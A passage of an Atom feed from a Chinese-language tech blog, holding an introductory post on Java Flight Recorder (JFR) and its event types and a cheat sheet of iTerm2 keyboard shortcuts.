    <id>https://0range228.github.io/JFR%E7%AC%94%E8%AE%B0/</id>
    <published>2021-01-20T01:58:30.000Z</published>
    <updated>2021-01-22T09:03:10.662Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>愿君多采撷，此物最相思。</p></blockquote><p>整理JFR相关知识 。</p><a id="more"></a><h1 id="什么是JFR？"><a href="#什么是JFR？" class="headerlink" title="什么是JFR？"></a>什么是JFR？</h1><p>JFR 是 Java Flight Record （Java飞行记录） 的缩写，是 JVM 内置的基于事件的JDK监控记录框架。这个起名就是参考了黑匣子对于飞机的作用，将Java进程比喻成飞机飞行，==主要用于问题定位和持续监控==。</p><p>JFR性能非常高效，对于业务影响很小，因为这个框架本来就是用来长期在线上部署的框架。这个记录可以输出成二进制文件，用户可以指定最大记录时间，或者最大记录大小，供用户在需要的时候输出成文件进行事后分析。</p><p>JFR 的前身也是 JFR，只不过这个 J 不是 Java 而是 JRockit。在 JRockit 虚拟机时代，就有这样一个工具用来记录 Java 虚拟机运行时各项数据。在 Oracle 收购 Sun 公司之后，Hotspot 虚拟机时代，也一直延续了这个工具：</p><ul><li>JFR 0.9 版本对应 JDK 7 和JDK 8：</li><li>在 JDK 8u40 之后，可以在运行时灵活地打开关闭 JFR。 </li><li>JFR 1.0 版本对应 JDK 9 和 JDK 10： 在这一版本之后，增加了 JFR 事件接口，用户可以生产或者消费某种事件。 </li><li>JFR 2.0 版本对应 JDK 11，详细讨论说明。</li></ul><p>JFR具有以下关键的特性： </p><ul><li><p>低开销，可在生产环境核心业务进程中始终在线运行。</p></li><li><p>可以进行运行时分析，可以分析 Java 应用程序，JVM 内部以及当前Java进程运行环境等多因素。</p></li><li><p>JFR基于事件采集，可以分析非常底层的信息，例如对象分配，方法采样与热点方法定位与调用堆栈，安全点分析与锁占用时长与堆栈分析，GC 相关分析以及 JIT 编译器相关分析（例如 CodeCache ）</p></li><li><p>完善的 API 定义，用户可以自定义事件的生产与消费。</p></li></ul><h1 id="核心-Event事件"><a href="#核心-Event事件" class="headerlink" title="核心-Event事件"></a>核心-Event事件</h1><p>在 JFR中，一切皆为 Event： </p><ul><li>任意JVM行为都是一个Event，类加载对应 Class Load Event </li><li>开启 JFR 记录也是一个Event，对应的就是 Recording Reason Event </li><li>就算是有 Event 丢失，他也是一个 Event，对应 Data Loss Event</li></ul><p>Event 在特定的时间点产生，每个Event是由<strong>名称</strong>，<strong>时间戳</strong>还有 <strong>Event Payload</strong>组成。</p><p>Event Payload包含例如 CPU负载、Event 发生之前还有之后的 Java 堆大小、 获取锁的线程 ID 等等。</p><p>大部分的 Event，都有 Event 是在哪个线程发生的，Event 发生的时候这个线程的调用栈，Event 的持续时间。</p><p>利用这些信息，我们可以回溯 Event 发生当时的情况。</p><h2 id="Event-分类"><a href="#Event-分类" class="headerlink" title="Event 分类"></a>Event 分类</h2><p>Event 按照采集方式可以分为三种：</p><ol><li>Instant Event：顾名思义，这种 Event 在发生时就立刻采集。例如：Throw Exception Event 还有 Thread Start Event，类似于这种==在某一时刻发生的 Event==。</li><li>Duration Event：这种 Event 需要耗费一些时间，在完成的时候会记录。对于这种类型的 Event，可以设置一个时间限制，超过这个时间限制的才会记录。例如 GC Event，Thread Sleep Event。</li><li>Sample Event（Requestable Event）：按照一定的频率采集，这个频率是可以配置的。例如 Thread Dump Event，Method Sampling Event</li></ol><p>由于 JFR 会采集很多很多的数据，为了效率，最好配置自己感兴趣的事件采集；</p><p>对于 Duration Event 设置时间限制，一般我们对于时间短的事件并不关心。</p><p>Event 会被写入 .jfr 的二进制文件（二进制文件对于应用来说读写效率最高）中，以 little endian base 128 的形式编码，这里我们用一个 Event 举个例子：</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;愿君多采撷，此物最相思。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;整理JFR相关知识 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="JFR" scheme="https://0range228.github.io/tags/JFR/"/>
    
  </entry>
  
  <entry>
    <title>iTerm2 快捷键速查手册</title>
    <link href="https://0range228.github.io/iTerm2-%E5%BF%AB%E6%8D%B7%E9%94%AE%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/"/>
    <id>https://0range228.github.io/iTerm2-%E5%BF%AB%E6%8D%B7%E9%94%AE%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/</id>
    <published>2020-12-23T02:33:40.000Z</published>
    <updated>2021-02-09T18:42:26.030Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>终南阴岭秀，积雪浮云端。</p></blockquote><p>整理敲板子过程中的快捷键 。</p><a id="more"></a><h1 id="Tab"><a href="#Tab" class="headerlink" title="Tab"></a>Tab</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">新建标签：command + t</span><br><span class="line"></span><br><span class="line">关闭标签：command + w</span><br><span class="line"></span><br><span class="line">切换标签：command + 数字 / command + 左右方向键</span><br><span class="line"></span><br><span class="line">切换全屏：command + enter</span><br><span class="line"></span><br><span class="line">查找：command + f</span><br></pre></td></tr></table></figure><h1 id="分屏"><a href="#分屏" class="headerlink" title="分屏"></a>分屏</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">垂直分屏：command + d</span><br><span class="line"></span><br><span class="line">水平分屏：command + shift + d</span><br><span class="line"></span><br><span class="line">切换屏幕：command + option + 方向键 / command + [ 或 command + ]</span><br><span class="line"></span><br><span class="line">查看历史命令：command + ;</span><br><span class="line"></span><br><span class="line">查看剪贴板历史：command + shift + h</span><br></pre></td></tr></table></figure><h1 id="文本操作"><a href="#文本操作" class="headerlink" title="文本操作"></a>文本操作</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">清除当前行：ctrl + u</span><br><span class="line"></span><br><span class="line">到行首：ctrl + a</span><br><span class="line"></span><br><span class="line">到行尾：ctrl + e</span><br><span class="line"></span><br><span class="line">按单词移动：option + 左/右 方向键</span><br><span class="line"></span><br><span class="line">上一条命令：ctrl + p</span><br><span class="line"></span><br><span class="line">删除到文本末尾：ctrl + k</span><br><span class="line"></span><br><span class="line">搜索命令历史：ctrl + r</span><br><span class="line"></span><br><span class="line">删除当前光标的字符：ctrl + d</span><br><span class="line"></span><br><span class="line">删除光标之前的字符：ctrl + h</span><br><span class="line"></span><br><span class="line">删除光标之前的单词：ctrl + w</span><br><span class="line"></span><br><span class="line">交换光标处文本：ctrl + t</span><br><span class="line"></span><br><span class="line">清屏1：command + r</span><br><span class="line"></span><br><span class="line">清屏2：ctrl + l</span><br><span class="line"></span><br><span class="line">⌘ + 数字在各 tab 标签直接来回切换</span><br><span class="line"></span><br><span class="line">选择即复制 + 鼠标中键粘贴，这个很实用</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;终南阴岭秀，积雪浮云端。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;整理敲板子过程中的快捷键 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Shell" scheme="https://0range228.github.io/categories/Shell/"/>
    
    
      <category term="iTerm2" scheme="https://0range228.github.io/tags/iTerm2/"/>
    
  </entry>
  
</feed>
